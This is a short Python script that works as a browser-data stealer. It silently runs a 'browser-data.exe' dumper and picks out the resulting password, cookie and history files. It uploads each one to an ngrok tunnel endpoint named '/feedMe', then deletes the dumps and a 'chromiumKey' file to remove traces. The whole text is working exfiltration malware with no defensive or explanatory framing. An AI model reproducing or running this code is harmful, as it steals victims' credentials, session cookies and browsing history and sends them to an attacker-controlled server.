import subprocess
import os
import requests
import shutil

FNULL = open(os.devnull, 'w')    # use this if you want to suppress output to stdout from the subprocess
executable = 'browser-data.exe'
subprocess.call(executable, stdout=FNULL, stderr=subprocess.STDOUT)
subprocess.call("taskkill /f /im " + executable, stdout=FNULL, stderr=subprocess.STDOUT)

lookingFor, folder = ['password', 'cookie', 'history'], 'results'
for filename in os.listdir(folder):
    data = filename[:-4].split('_')[-1] 
    if data in lookingFor:
        with open(os.path.join(folder, filename), 'rb') as f:
            r = requests.post('https://3213-2806-103e-16-b243-787b-afe0-9534-664d.ngrok.io/feedMe', files={'file': f})
shutil.rmtree(folder)
os.remove('chromiumKey')